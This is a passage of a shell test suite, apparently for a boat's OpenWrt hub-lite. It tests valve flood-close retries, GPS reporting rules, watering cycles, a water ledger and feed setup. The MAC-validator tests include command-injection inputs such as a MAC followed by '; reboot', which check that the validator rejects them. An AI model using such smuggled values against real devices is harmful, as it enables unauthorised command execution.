check "flood close targets api.shtml" "http://192.168.8.20/api.shtml" "$(head -1 "$_CURL_LOG" | cut -d' ' -f1)"
check "flood close normalises the 16-hex id like the TS client" \
  '{"cmd":7,"gw_id":"GW02","dev_id":"bbbbccccddddeeee"}' "$(sed -n 2p "$_CURL_LOG" | cut -d' ' -f2-)"
check "each close spools a flood_close.change line" "2" "$(grep -c 'linktap.flood_close.change' "$_SPOOL_T" | tr -d ' ')"
check "the spool line carries the outcome" "ok=1" "$(head -1 "$_SPOOL_T" | cut -f4)"

# a failing gateway spools ok=0 and does not abort the loop
curl() { return 22; }
: > "$_CURL_LOG"; : > "$_SPOOL_T"
# The close claimed above is still in flight, and a flood does not override a flood — so this second
# alarm would ride that sequence and send nothing. Clear it: what is under test here is a FRESH close
# meeting a dead gateway.
rm -f "$_LT_T"/close.*
LINKTAP_HOST="192.168.8.20" LINKTAP_GW_ID="GW02" LINKTAP_DEV_IDS="aaaabbbbccccdddd" \
BRVG_RELAY_SPOOL="$_SPOOL_T" linktap_flood_close
check "a failed close is spooled as ok=0" "ok=0" "$(head -1 "$_SPOOL_T" | cut -f4)"
unset -f curl
rm -f "$_CURL_LOG" "$_SPOOL_T"
check "a failed close is nonetheless WATCHED, so it is retried rather than lost" "1" \
  "$(ls "$_LT_T"/close.* 2>/dev/null | wc -l | tr -d ' ')"
LT_STATE_DIR="$_LT_SAVE"; rm -rf "$_LT_T"

# unconfigured = strict no-op (every existing install)
_SPOOL_T=$(mktemp)
LINKTAP_HOST="" LINKTAP_GW_ID="" LINKTAP_DEV_IDS="" BRVG_RELAY_SPOOL="$_SPOOL_T" linktap_flood_close
check "no LinkTap config -> no-op, nothing spooled" "0" "$(wc -c < "$_SPOOL_T" | tr -d ' ')"
rm -f "$_SPOOL_T"

# --- gps_should_send (report-by-exception; 0.17.0 rules, telemetry design §A7.2) ---
# Chicago-ish anchor point; a point ~180 m away for the "moved" cases.
_A_LAT=41.87811; _A_LON=-87.62980
_FAR_LAT=41.87811; _FAR_LON=-87.62760   # ~180 m east
_NEAR_LAT=41.87811; _NEAR_LON=-87.62945 # ~29 m east
GPS_DEADBAND_M=50
# $1 lat $2 lon $3 acc $4 armed $5 outside $6 leased $7 underway $8 force
send_verdict() { if gps_should_send "$@"; then echo send; else echo skip; fi; }

GPS_LAST_LAT=""; GPS_LAST_LON=""; GPS_LAST_SENT=0
check "gps: first fix of the run always sends" "send" "$(send_verdict "$_A_LAT" "$_A_LON" - 0 0 0 0)"

GPS_LAST_LAT=$_A_LAT; GPS_LAST_LON=$_A_LON; GPS_LAST_SENT=$(date +%s)
check "gps: parked, unarmed, unmoved -> skip" "skip" "$(send_verdict "$_A_LAT" "$_A_LON" - 0 0 0 0)"
check "gps: moved past the 50 m deadband -> send" "send" "$(send_verdict "$_FAR_LAT" "$_FAR_LON" 5 0 0 0 0)"
GPS_LAST_SENT=$(( $(date +%s) - 86400 ))
check "gps: NO liveness send any more — a day unmoved is still a skip (the check-in is the liveness)" "skip" "$(send_verdict "$_A_LAT" "$_A_LON" - 0 0 0 0)"
check "gps: a move past the deadband but inside twice the fix's accuracy is noise -> skip" "skip" "$(send_verdict "$_FAR_LAT" "$_FAR_LON" 95 0 0 0 0)"
GPS_DEADBAND_M=0
check "gps: the deadband has a 25 m floor — 0 no longer means send every tick" "skip" "$(send_verdict "$_A_LAT" "$_A_LON" - 0 0 0 0)"
GPS_DEADBAND_M=10
check "gps: a 10 m deadband is floored to 25 m (wander is 5-15 m)" "skip" "$(send_verdict 41.87811 -87.62970 - 0 0 0 0)"
check "gps: ...and ~29 m clears that floor" "send" "$(send_verdict "$_NEAR_LAT" "$_NEAR_LON" 2 0 0 0 0)"
GPS_DEADBAND_M=50
check "gps: ARMED and inside the circle sends NO position (heartbeats only)" "skip" "$(send_verdict "$_FAR_LAT" "$_FAR_LON" 5 1 0 0 0)"
check "gps: armed and OUTSIDE sends every tick (breach positions)" "send" "$(send_verdict "$_A_LAT" "$_A_LON" 5 1 1 0 0)"
check "gps: while LEASED every sample is sent, moved or not" "send" "$(send_verdict "$_A_LAT" "$_A_LON" - 0 0 1 0)"
check "gps: while leased and armed inside, still every sample" "send" "$(send_verdict "$_A_LAT" "$_A_LON" - 1 0 1 0)"
GPS_LAST_SENT=$(( $(date +%s) - 30 ))
check "gps: UNDERWAY 30 s after the last position -> skip (owner: every 5 minutes)" "skip" "$(send_verdict "$_FAR_LAT" "$_FAR_LON" 5 0 0 0 1)"
GPS_LAST_SENT=$(( $(date +%s) - 300 ))
check "gps: UNDERWAY 300 s after the last position -> send" "send" "$(send_verdict "$_A_LAT" "$_A_LON" - 0 0 0 1)"
GPS_LAST_SENT=$(date +%s)
check "gps: underway while LEASED still sends every sample" "send" "$(send_verdict "$_A_LAT" "$_A_LON" - 0 0 1 1)"
check "gps: underway and OUTSIDE an armed ring still sends breach positions" "send" "$(send_verdict "$_A_LAT" "$_A_LON" - 1 1 0 1)"
check "gps: the underway send interval is 300 s" "300" "$UW_SEND_SEC"
check "gps: force (a command follow-up, a disarm) always sends" "send" "$(send_verdict "$_A_LAT" "$_A_LON" - 1 0 0 0 force)"

# (The pass/fail summary used to sit HERE, part-way down the file — so every check below it could
# fail and the script still exited 0. It is at the bottom now.)

# --- LinkTap cycle semantics on hub-lite (parity port) -------------------------------------------
# These fixtures MIRROR hub/test/cycle.test.ts case for case — the one-contract rule. A case added
# there gets added here.

# lt_parse_status
out=$(printf '{"cmd":3,"dev_stat":[{"is_watering":1,"volume":0.63,"remain_duration":79940}]}' | lt_parse_status gal)
check "lt parse: watering, gal→L conversion (0.63 gal = 2.385 L)" "1 2.385 79940 0.000" "$out"
out=$(printf '{"is_watering":0,"volume":15886307.00}' | lt_parse_status gal)
check "lt parse: the idle garbage latch reads as no volume (absent remain is '-', never an empty field)" "0 0.000 - 0.000" "$out"
out=$(printf '<html><body><!--#RET-->{"is_watering":"1","volume":2,"remain_duration":60}</body></html>' | lt_parse_status L)
check "lt parse: HTML wrap + string flag + litre unit" "1 2.000 60 0.000" "$out"

# lt_decide — the decision table, mirroring cycle.test.ts
check "decide: idle + watering = adopt (manual press IS a Normal Run)" "adopt" "$(lt_decide idle 1 0.5 100 "" 0 86400)"
check "decide: idle + closed = none" "none" "$(lt_decide idle 0 0 100 "" 0 86400)"
check "decide: cap reached = cut" "cut" "$(lt_decide watering 1 100.2 100 "" 300 86400)"
check "decide: cap reached but stop already issued = none (no re-issue storm)" "none" "$(lt_decide watering 1 101 100 "volume_cap" 320 86400)"
check "decide: under the cap = none" "none" "$(lt_decide watering 1 50 100 "" 300 86400)"
check "decide: no cap (washdown shape) never cuts" "none" "$(lt_decide watering 1 5000 0 "" 300 7200)"
# The lead-time cutoff — mirrors daemon cycle.rs cutoff_trigger_l. Numbers measured on MVP
# 2026-08-22: 22.07 L/min (5.83 gal/min) x 8 s = ~2.94 L of overshoot.
check "decide: leads the cap by the stop latency (fires BELOW the cap when flowing)" "cut" \
  "$(lt_decide watering 1 35.0 37.85 "" 300 86400 22.07)"
check "decide: same volume with NO speed does NOT cut early (degrades to old behaviour)" "none" \
  "$(lt_decide watering 1 35.0 37.85 "" 300 86400 0)"
check "decide: speed arg omitted entirely still behaves as before" "none" \
  "$(lt_decide watering 1 35.0 37.85 "" 300 86400)"
check "decide: a trickle barely leads — 39 L under a 40 L cap at 1 L/min is not yet a cut" "none" \
  "$(lt_decide watering 1 38.7 40 "" 300 86400 1.0)"
check "decide: cap smaller than the overshoot cuts at the first sign of flow" "cut" \
  "$(lt_decide watering 1 0.1 1.0 "" 5 86400 22.07)"
check "decide: no cap still never cuts however fast it flows" "none" \
  "$(lt_decide watering 1 5000 0 "" 300 7200 22.07)"
check "decide: closed after our stop = ended:volume_cap" "ended:volume_cap" "$(lt_decide watering 0 100.5 100 "volume_cap" 350 86400)"
check "decide: THE BUG CASE — hardware cap stop inside one poll = ended:volume_cap, not timer" "ended:volume_cap" "$(lt_decide watering 0 100.3 100 "" 120 600)"
check "decide: closed within a minute of duration = ended:timer" "ended:timer" "$(lt_decide watering 0 40 100 "" 590 600)"
check "decide: early close, no explanation = ended:unknown" "ended:unknown" "$(lt_decide watering 0 5 100 "" 60 600)"
check "decide: flood stop classifies as flood_shutoff" "ended:flood_shutoff" "$(lt_decide watering 0 30 0 "flood_shutoff" 60 7200)"

# --- THE CLOSE: confirm, then retry (parity with daemon/src/close_watch.rs) ----------------------
#
# 🔴 THE FAILURE BEING TESTED IS AN ACCEPTED COMMAND OVER AN OPEN VALVE. `lt_post` exiting 0 means the
# GATEWAY TOOK the request; the measured failure mode is a `ret: 0` on a command never delivered to the
# valve over RF. Success is the valve's OWN reported state, and everything below is the schedule that
# keeps asking it.
check "close: the schedule is the owner's numbers — 5/10/20/40 then every 60, confirm 10, tell at 300, give up 1800" \
  "10|5 10 20 40|60|300|1800" "$LT_CLOSE_CONFIRM_WITHIN|$LT_CLOSE_RETRY_AT|$LT_CLOSE_EVERY|$LT_CLOSE_ALERT_AT|$LT_CLOSE_GIVE_UP"
# THE RELATIONSHIP, which must hold whatever the two become: he is told while the hub is still trying.
check "close: the owner is told BEFORE the hub stops trying" "yes" \
  "$([ "$LT_CLOSE_ALERT_AT" -lt "$LT_CLOSE_GIVE_UP" ] && echo yes || echo no)"
check "close: attempt 1 is the close itself, due immediately" "0" "$(lt_close_due_at 1)"
check "close: the named offsets" "5 10 20 40" \
  "$(lt_close_due_at 2) $(lt_close_due_at 3) $(lt_close_due_at 4) $(lt_close_due_at 5)"
check "close: then every 60 s, counted from the LAST named offset (40+60, not 60n)" "100 160 220 280" \
  "$(lt_close_due_at 6) $(lt_close_due_at 7) $(lt_close_due_at 8) $(lt_close_due_at 9)"
check "close: nine attempts have been made by the time he is TOLD (the tenth falls at 340 s)" "340 yes" \
  "$(lt_close_due_at 10) $([ "$(lt_close_due_at 10)" -gt "$LT_CLOSE_ALERT_AT" ] && echo yes || echo no)"
# 🔴 THE REAL CEILING IS 34, the cost of the owner's 30-minute retry window — a measured number
# rather than a surprise on the RF budget. Same RATE as before (one cmd 7 a minute); only the duration grew.
check "close: 34 attempts is the ceiling, the last at 1780 s" "1780 1840 yes" \
  "$(lt_close_due_at 34) $(lt_close_due_at 35) $([ "$(lt_close_due_at 34)" -lt "$LT_CLOSE_GIVE_UP" ] && [ "$(lt_close_due_at 35)" -gt "$LT_CLOSE_GIVE_UP" ] && echo yes || echo no)"
# lt_close_alert_due: silent for five minutes, once at five, never again.
check "close: silent before the alert point, then told exactly once" "no yes no" \
  "$(lt_close_alert_due 1000 0 1 1299 && echo yes || echo no) $(lt_close_alert_due 1000 0 1 1300 && echo yes || echo no) $(lt_close_alert_due 1000 1 1 1300 && echo yes || echo no)"
check "close: a valve that reports SHUT is never alerted about" "no" \
  "$(lt_close_alert_due 1000 0 0 9999 && echo yes || echo no)"

# lt_close_step: first=1000, and the valve's own answer decides everything.
check "close: a valve that reports SHUT is confirmed, whatever the clock says" "confirmed confirmed confirmed" \
  "$(lt_close_step 1000 1000 1 0 1000) $(lt_close_step 1000 1000 1 0 1004) $(lt_close_step 1000 1000 9 0 1999)"
check "close: still open before the first retry is due = wait" "wait" "$(lt_close_step 1000 1000 1 1 1004)"
check "close: still open AT the first offset = reissue" "reissue" "$(lt_close_step 1000 1000 1 1 1005)"
# 🔴 RETRYING CONTINUES ACROSS THE ALERT POINT — being told is not being given up on, which is
# the whole of the owner's split. At 300 s (elapsed) the hub speaks and keeps issuing to 1800 s.
check "close: at the alert point it is still working, not finished" "reissue" "$(lt_close_step 1000 1280 9 1 1340)"
check "close: still re-issuing 25 minutes after he was told" "reissue" "$(lt_close_step 1000 2740 33 1 2780)"
check "close: one second before the window closes it is still trying" "wait" "$(lt_close_step 1000 2780 34 1 2799)"
check "close: at 1800 s it gives up" "gave_up" "$(lt_close_step 1000 2780 34 1 2800)"
check "close: and stays given up rather than starting again" "gave_up" "$(lt_close_step 1000 2780 34 1 99999)"
(
  # ⚠️ ORDER IS LOAD-BEARING: a retry falling due at the exact give-up instant must NOT put one more
  # command on the wire after the hub has decided to stop trying.
  LT_CLOSE_RETRY_AT="1800"
  check "close: the give-up boundary beats a retry due at the same instant" "gave_up" "$(lt_close_step 1000 1000 1 1 2800)"
)
check "close: the next look is the first retry, 5 s out" "5" "$(lt_close_next_look 1000 1000 1 1000)"
check "close: out where retries are a minute apart, the CONFIRM deadline binds instead" "10" \
  "$(lt_close_next_look 1000 1100 6 1100)"
check "close: and once that read has happened the deadline is spent — the next look is the re-issue" "50" \
  "$(lt_close_next_look 1000 1100 6 1110)"
check "close: never zero, however late the caller is" "1" "$(lt_close_next_look 1000 1280 9 99999)"

# 🔴 EMPTY IS NOT 0. A reply that does not say tells us nothing about the valve; reading it as "shut"
# would confirm a close that never happened, on exactly the boat whose gateway has just died.
check "close: is_watering true/1 reads open" "1 1 1" \
  "$(printf '{"is_watering":true}' | lt_watering_from_status) $(printf '{"dev_stat":[{"is_watering":1}]}' | lt_watering_from_status) $(printf '{"is_watering":"1"}' | lt_watering_from_status)"
check "close: is_watering false/0 reads shut" "0 0" \
  "$(printf '{"is_watering":false}' | lt_watering_from_status) $(printf '{"dev_stat":[{"is_watering":0}]}' | lt_watering_from_status)"
check "close: a reply that does not say is EMPTY, never 0" "" "$(printf '{"ret":5}' | lt_watering_from_status)"
check "close: junk is EMPTY too" "" "$(printf 'not json at all' | lt_watering_from_status)"

# One in-flight close per valve, with one exception.
check "close: a flood overrides a manual or volume close in flight" "yes yes" \
  "$(lt_close_overrides flood manual && echo yes || echo no) $(lt_close_overrides flood volume_cap && echo yes || echo no)"
check "close: and nothing else overrides anything — including a flood over a flood" "no no no" \
  "$(lt_close_overrides flood flood && echo yes || echo no) $(lt_close_overrides manual flood && echo yes || echo no) $(lt_close_overrides volume_cap manual && echo yes || echo no)"
check "close: the cause marks the run with the reason that names it" "flood_shutoff volume_cap manual" \
  "$(lt_close_end_reason flood) $(lt_close_end_reason volume_cap) $(lt_close_end_reason manual)"

# ⚠️ THE EVENT NAME, against the worker's own three classifiers rather than against a comment claiming
# it is safe: `is_flood_shutoff` IS the ported flood rule, `*_off`/`*.off` reads as an ALL-CLEAR, and
# `*.change`/`*.measurement` reads as never-pushed telemetry.
check "close: the alert name is not a flood alarm to the hub's own classifier" "no" \
  "$(is_flood_shutoff "$LT_CLOSE_UNCONFIRMED_EVENT" && echo yes || echo no)"
check "close: it is the one string all three repos answer to" "linktap.valve.close_unconfirmed" "$LT_CLOSE_UNCONFIRMED_EVENT"
name_traps() { case "$1" in *flood*|*leak*|*alarm*|*off*|*.change|*.measurement|*closed*) echo dirty ;; *) echo clean ;; esac; }
check "close: the trap check itself can fail (a name that would be read as an all-clear)" "dirty dirty dirty" \
  "$(name_traps linktap.valve.close_off) $(name_traps linktap.flood.unconfirmed) $(name_traps linktap.valve.not_closed)"
check "close: it carries no flood/leak/alarm, no off, no telemetry suffix, and not 'closed'" "clean" \
  "$(name_traps "$LT_CLOSE_UNCONFIRMED_EVENT")"


# lt_should_restart — only a timer expiry restarts
lt_should_restart timer 1 && _r=yes || _r=no
check "restart: timer + enabled = yes" "yes" "$_r"
for reason in volume_cap manual flood_shutoff unknown; do
  lt_should_restart "$reason" 1 && _r=yes || _r=no
  check "restart: $reason never restarts" "no" "$_r"
done
lt_should_restart timer 0 && _r=yes || _r=no
check "restart: disabled means disabled" "no" "$_r"

# lt_start_body — cmd 6, duration seconds, volume_limit in the gateway unit
# lt_parse_status now emits: watering volume remain SPEED (speed in L/min, gal converted)
check "parse_status extracts speed and converts gal/min -> L/min" "1 15.142 270 22.069" \
  "$(printf '%s' '{"is_watering":true,"volume":4.0,"remain_duration":270,"speed":5.83}' | lt_parse_status gal)"
check "parse_status: absent speed is 0 (lead disabled, not corrupted)" "1 4.000 270 0.000" \
  "$(printf '%s' '{"is_watering":true,"volume":4.0,"remain_duration":270}' | lt_parse_status litre)"

check "lt_start_body shape" '{"cmd":6,"gw_id":"GW02","dev_id":"aaaabbbbccccdddd","duration":86400,"volume_limit":26.42}' \
  "$(lt_start_body GW02 aaaabbbbccccdddd 86400 26.42)"

# --- Wire profiles on hub-lite (config-as-state; mirrors the TS sender/runtime pair) --------------
REPLY='{"status":"ok","stored":2,"commands":[{"id":"c1","cmd":"report_now"}],"linktap":{"profiles":{"aaaabbbbccccdddd":{"durationSecs":7200,"volumeCapL":250.5,"autoRestart":true},"bbbbccccddddeeee":{"volumeCapL":50}}}}'

out=$(printf '%s' "$REPLY" | lt_parse_profiles)
check "wire profiles: full profile parses" "aaaabbbbccccdddd 7200 250.5 1" "$(printf '%s\n' "$out" | sed -n 1p)"
check "wire profiles: partial profile keeps '-' for unset fields (skip-don't-default)" \
  "bbbbccccddddeeee - 50 -" "$(printf '%s\n' "$out" | sed -n 2p)"

out=$(printf '{"status":"ok"}' | lt_parse_profiles)
check "wire profiles: reply without the blob parses to nothing" "" "$out"

# a later object-valued key must not be misread as a valve
out=$(printf '{"linktap":{"profiles":{"aaaabbbbccccdddd":{"volumeCapL":10}}},"other":{"x":{"volumeCapL":99}}}' | lt_parse_profiles)
check "wire profiles: the walk stops at the profiles-closing brace" "aaaabbbbccccdddd - 10 -" "$out"

# apply → per-valve files, then the tick's field-by-field override
_LT_T=$(mktemp -d)
LT_STATE_DIR="$_LT_T" lt_apply_profiles <<'EOP'
aaaabbbbccccdddd 7200 250.5 1
bbbbccccddddeeee - 50 -
EOP
check "apply: full profile file" "P_DUR=7200
P_VOL=250.5
P_AR=1" "$(cat "$_LT_T/profile.aaaabbbbccccdddd")"
check "apply: partial profile file carries only the set fields" "P_VOL=50" "$(cat "$_LT_T/profile.bbbbccccddddeeee")"

# effective profile: wire over conf, field by field (the profileFor rule)
P_DUR=""; P_VOL=""; P_AR=""
. "$_LT_T/profile.bbbbccccddddeeee"
_dur="${P_DUR:-86400}"; _capL="${P_VOL:-378}"; _ar="${P_AR:-0}"
check "effective: wire cap wins" "50" "$_capL"
check "effective: unset duration falls to the conf default" "86400" "$_dur"
check "effective: unset autoRestart falls to the conf default" "0" "$_ar"
rm -rf "$_LT_T"

# --- The daily ledger on hub-lite (parity port of cycle.ts applyToLedger) -------------------------
_LD=$(mktemp -d)
_LF="$_LD/ledger.aaaabbbbccccdddd"

out=$(lt_ledger_apply normal 40 2026-08-19 "$_LF")
check "ledger: first normal run starts the day" "40.00" "$out"
out=$(lt_ledger_apply tankfill 60 2026-08-19 "$_LF")
check "ledger: tank fill accumulates" "100.00" "$out"

# Owner rule: washdown does NOT count against the daily value.
out=$(lt_ledger_apply washdown 500 2026-08-19 "$_LF")
check "ledger: washdown contributes NOTHING" "100.00" "$out"

# ...but it still rolls the day, so tomorrow's first run cannot resume yesterday's total.
out=$(lt_ledger_apply washdown 500 2026-08-20 "$_LF")
check "ledger: a washdown on a new day rolls the date and stays zero" "0.00" "$out"
out=$(lt_ledger_apply normal 25 2026-08-20 "$_LF")
check "ledger: the new day accumulates from zero, not from yesterday" "25.00" "$out"

# A brand-new valve (no file yet) starts clean.
out=$(lt_ledger_apply normal 12.5 2026-08-20 "$_LD/ledger.newvalve")
check "ledger: an unseen valve starts at its own first run" "12.50" "$out"

check "ledger: day keys are UTC ISO dates" "$(date -u +%F)" "$(lt_day_key)"
rm -rf "$_LD"

# --- LAN management door: valid_mac (hub-lite-mgmt.sh POST ?action=lockdown) ---
# This is what replaces "the app SSHes a generated uci script in as root", so the interesting
# cases are the ones that must NOT reach a uci argument.
check "mac: a plain lowercase address" "0" "$(valid_mac 'aa:bb:cc:dd:ee:ff'; echo $?)"
check "mac: uppercase is equally valid" "0" "$(valid_mac 'AA:BB:CC:DD:EE:FF'; echo $?)"
check "mac: mixed case, digits" "0" "$(valid_mac '3C:1e:04:AB:90:7f'; echo $?)"
check "mac: empty string rejected" "1" "$(valid_mac ''; echo $?)"
check "mac: too short rejected" "1" "$(valid_mac 'aa:bb:cc:dd:ee'; echo $?)"
check "mac: too long rejected" "1" "$(valid_mac 'aa:bb:cc:dd:ee:ff:00'; echo $?)"
check "mac: hyphen form rejected (uci wants colons)" "1" "$(valid_mac 'aa-bb-cc-dd-ee-ff'; echo $?)"
check "mac: non-hex rejected" "1" "$(valid_mac 'zz:bb:cc:dd:ee:ff'; echo $?)"
check "mac: a command substitution is not a MAC" "1" "$(valid_mac 'aa:bb:cc:dd:ee:ff; reboot'; echo $?)"
check "mac: a semicolon anywhere is fatal" "1" "$(valid_mac ';reboot'; echo $?)"
check "mac: whitespace rejected" "1" "$(valid_mac 'aa:bb:cc:dd:ee:f '; echo $?)"

# --- LAN management door: state_pairs ---
# The CGI serves this verbatim as JSON, so the encoding has to survive the app's parser
# (parseCachedModem) and must never emit an unescaped quote.
out=$(state_pairs "modem.measurement" "up=1&mode=LTE&rsrp=-104&carrier=T-Mobile")
check "state: a plain report becomes quoted pairs" '"up":"1","mode":"LTE","rsrp":"-104","carrier":"T-Mobile"' "$out"

out=$(state_pairs "modem.measurement" "carrier=T%20Mobile%20US")
check "state: %20 comes back as a space, as the worker decodes it" '"carrier":"T Mobile US"' "$out"

out=$(state_pairs "modem.measurement" "up=1&empty=&=novalue&mode=LTE")
check "state: half-pairs are dropped rather than emitted broken" '"up":"1","mode":"LTE"' "$out"

out=$(state_pairs "modem.measurement" 'carrier=A"B\C')
check "state: quotes and backslashes are stripped, never emitted raw" '"carrier":"ABC"' "$out"

out=$(state_pairs "modem.measurement" "")
check "state: an empty report emits nothing at all" "" "$out"

# write_state must produce ONE parseable object, and must not leave its temp file behind.
_SD=$(mktemp -d)
HUB_LITE_STATE="$_SD/state"
write_state "modem.measurement" "up=1&rsrp=-104"
out=$(cat "$HUB_LITE_STATE")
case "$out" in
  '{"v":1,"event":"modem.measurement","ts":'*',"av":"'*'","up":"1","rsrp":"-104"}') r=ok ;;
  *) r="$out" ;;
esac
check "write_state: one object, version + timestamp + the reported values" "ok" "$r"
check "write_state: no temp file left behind" "1" "$(ls "$_SD" | wc -l | tr -d ' ')"
rm -rf "$_SD"

# --- state_pairs must not duplicate `av` (real bench capture, 2026-08-21) ---
# write_state puts `av` in the object header, and push_modem's param string carries it too, so the
# first live capture off the GL-X750 had TWO "av" keys in one object.
out=$(state_pairs "modem.measurement" "up=1&av=0.14.1&rsrp=-107")
check "state: av is dropped from the params — the header already has it" '"up":"1","rsrp":"-107"' "$out"

_SD2=$(mktemp -d)
HUB_LITE_STATE="$_SD2/state"
write_state "modem.measurement" "up=1&av=9.9.9&rsrp=-107"
check "write_state: exactly one av in the object" "1" "$(tr ',' '\n' < "$HUB_LITE_STATE" | grep -c '"av"')"
check "write_state: and it is the header's version, not the param's" "1" "$(grep -c "\"av\":\"$HUB_LITE_VERSION\"" "$HUB_LITE_STATE")"
rm -rf "$_SD2"

# ── The /api/hub/* door (owner ruling 2026-08-31: "move to 8722, keep one contract") ────────────
#
# A hub-lite now answers the SAME paths as the Rust daemon, so the app has one hub client rather
# than a second ?action= dialect. These pin the contract, because a shape mismatch here is not a
# hub-lite bug — it is the app silently treating a live hub as absent.
# (The 0.14.x api cases lived here, against a hand-made conf with `VEHICLE_ID=` and a state-file
# format nothing writes — which is how four broken routes passed. They are rewritten against the REAL
# conf keys and the REAL state below, in the 0.15.0 section.)

# ── Washdown on hub-lite (owner: "washdown after") ──────────────────────────────────────────────
#
# 🔴 THE RESTART GUARD IS THE SAFETY ONE. The daemon requires mode == Normal to auto-restart
# (cycle.rs should_auto_restart); this tier checked reason and the switch only. Latent while it ran
# Normal Runs exclusively — a live water-safety bug the moment washdown exists, because a washdown
# ending on its own timer would restart as ANOTHER washdown, uncapped, forever.
lt_should_restart timer 1 normal   && check "restart: a Normal Run timer expiry restarts" "1" "1"
lt_should_restart timer 1 washdown && check "restart: A WASHDOWN MUST NOT RESTART" "never" "reached" || \
  check "restart: A WASHDOWN MUST NOT RESTART" "1" "1"
lt_should_restart timer 1 tankfill && check "restart: a tank fill must not restart either" "never" "reached" || \
  check "restart: a tank fill must not restart either" "1" "1"
lt_should_restart timer 1 ""       && check "restart: a state file with no mode is a Normal Run" "1" "1"
lt_should_restart volume_cap 1 normal && check "restart: a volume cap must not restart" "never" "reached" || \
  check "restart: a volume cap must not restart" "1" "1"
lt_should_restart timer 0 normal && check "restart: the switch still governs" "never" "reached" || \
  check "restart: the switch still governs" "1" "1"

# A washdown is TIME-ONLY: cap 0 disables the cutoff, so no volume can end it.
out=$(lt_decide watering 1 999999 0 "" 10 300 5)
check "washdown: no volume cuts a cap-less run" "none" "$out"
out=$(lt_decide watering 0 999999 0 "" 300 300 0)
check "washdown: it ends on its TIMER, whatever the volume" "ended:timer" "$out"

# The ledger: a washdown contributes nothing but still rolls the day.
_ldir=$(mktemp -d 2>/dev/null || echo /tmp/brvg-ldg.$$); mkdir -p "$_ldir"
out=$(lt_ledger_apply washdown 500 2026-09-01 "$_ldir/l")
check "ledger: a washdown adds nothing" "0.00" "$out"
out=$(lt_ledger_apply normal 40 2026-09-01 "$_ldir/l")
check "ledger: a Normal Run after it still counts from zero" "40.00" "$out"
rm -rf "$_ldir"

# ── The persisted cycle must actually load ──────────────────────────────────────────────────────
#
# 🔴 IT DID NOT, AND THE COST WAS THE VOLUME CUTOFF. The state file writes `state=` and the machine
# reads `_state`; sourcing sets the UNPREFIXED name, so _state was `idle` on EVERY tick. lt_decide
# only evaluates the software cutoff on the `_prev != idle` branch, so it returned `adopt` forever
# and the cutoff never fired — on the tier whose own comment calls it "the only volume enforcement
# there is", because the hardware ignores volume_limit. A hub-lite vessel had no volume bound on its
# water at all; only the duration ceiling ever stopped a run.
_lsdir=$(mktemp -d 2>/dev/null || echo /tmp/brvg-ls.$$); mkdir -p "$_lsdir"

printf 'state=watering\nstarted=1700000000\nstop=volume_cap\nmode=washdown\ndur=300\ncap=0\n' > "$_lsdir/a"
lt_load_state "$_lsdir/a" 86400 378
check "load: a watering valve reads as WATERING, not idle" "watering" "$_state"
check "load: started survives (elapsed was measured from epoch 0)" "1700000000" "$_started"
check "load: stop_issued survives, so a cut is not re-issued every tick" "volume_cap" "$_stop"
check "load: the run's own mode survives" "washdown" "$_mode"
check "load: and its own targets beat the profile's" "300 0" "$_dur_eff $_cap_eff"

# The end-to-end consequence: a NORMAL run past its cap must now reach the cutoff branch at all.
printf 'state=watering\nstarted=1700000000\nstop=\nmode=normal\ndur=86400\ncap=378\n' > "$_lsdir/b"
lt_load_state "$_lsdir/b" 86400 378
out=$(lt_decide "$_state" 1 400 "$_cap_eff" "$_stop" 100 "$_dur_eff" 0)
check "load: THE VOLUME CUTOFF FIRES — 400L past a 378L cap" "cut" "$out"

# A file with no mode/dur/cap is a Normal Run on the profile — what every older file meant.
printf 'state=watering\nstarted=1700000000\nstop=\n' > "$_lsdir/c"
lt_load_state "$_lsdir/c" 86400 378
check "load: an older state file is a Normal Run on the profile" "normal 86400 378" "$_mode $_dur_eff $_cap_eff"

# Absent file: idle, and no inherited values from the valve before it in the loop.
lt_load_state "$_lsdir/nope" 86400 378
check "load: no file means idle" "idle" "$_state"
check "load: and nothing leaks in from the previous valve" "normal 86400 378 0 " "$_mode $_dur_eff $_cap_eff $_started $_stop"
rm -rf "$_lsdir"

# --- feed-setup: the signed-feed provisioner --------------------------------------------------
# feed-setup.sh writes an absolute /etc/opkg tree, so run it against a sandbox root by rewriting
# that prefix. What matters: the trust anchor lands under the fingerprint opkg looks up, the
# customfeeds line is present exactly once however many times it runs, and an unrelated feed line
# already in the file survives.
_fsroot=$(mktemp -d)
sed "s#/etc/opkg#$_fsroot/etc/opkg#g" "$HL_DIR/package/feed-setup.sh" > "$_fsroot/fs.sh"
sh "$_fsroot/fs.sh" >/dev/null 2>&1
sh "$_fsroot/fs.sh" >/dev/null 2>&1   # twice — the interesting case is idempotency
printf 'src/gz openwrt_core https://downloads.openwrt.org/x\n' >> "$_fsroot/etc/opkg/customfeeds.conf"
sh "$_fsroot/fs.sh" >/dev/null 2>&1
check "feed-setup: exactly one brvg feed line after three runs" "1" "$(grep -c 'brvg_hublite' "$_fsroot/etc/opkg/customfeeds.conf")"
check "feed-setup: an unrelated feed line is preserved" "1" "$(grep -c 'openwrt_core' "$_fsroot/etc/opkg/customfeeds.conf")"
check "feed-setup: the trust anchor is named by the committed key's fingerprint" "yes" "$([ -f "$_fsroot/etc/opkg/keys/b0ff2bec314c57d3" ] && echo yes || echo no)"
check "feed-setup: the installed key is byte-identical to the committed public key" "same" "$(cmp -s "$_fsroot/etc/opkg/keys/b0ff2bec314c57d3" "$HL_SRC/package/brvg-feed.pub" && echo same || echo differ)"
# The fingerprint in feed-setup.sh MUST match the committed key — a mismatch means opkg looks up a
# key file that verification will never find. Recompute it from the key blob the way usign does is
# out of scope for a pure-shell test, so assert the two constants agree with each other instead.
check "feed-setup: its fingerprint constant matches the key filename it writes" "b0ff2bec314c57d3" "$(sed -n 's/^KEY_FINGERPRINT="\([^"]*\)".*/\1/p' "$HL_DIR/package/feed-setup.sh")"
rm -rf "$_fsroot"

# ═════════════════════════════════════════════════════════════════════════════════════════════════
# 0.15.0 — daemon parity, slices 1-3 (hub-lite-parity.md). Everything below uses the REAL conf keys
# and the REAL state the collector writes.
# ═════════════════════════════════════════════════════════════════════════════════════════════════
T=$(mktemp -d)
mkdir -p "$T/bin" "$T/lt"
# A PATH shim for the CGIs, which run as separate processes and so cannot see a shell function. It
# logs every call and answers like a GL-X750's gateway, the worker, logread and `ip` would.
cat > "$T/bin/curl" <<'SHIM'
#!/bin/sh
body=""; prev=""; out=""; fmt=""
for a in "$@"; do
  case "$prev" in -d) body="$a" ;; -o) out="$a" ;; -w) fmt="$a" ;; esac
  prev="$a"
done
eval "url=\${$#}"
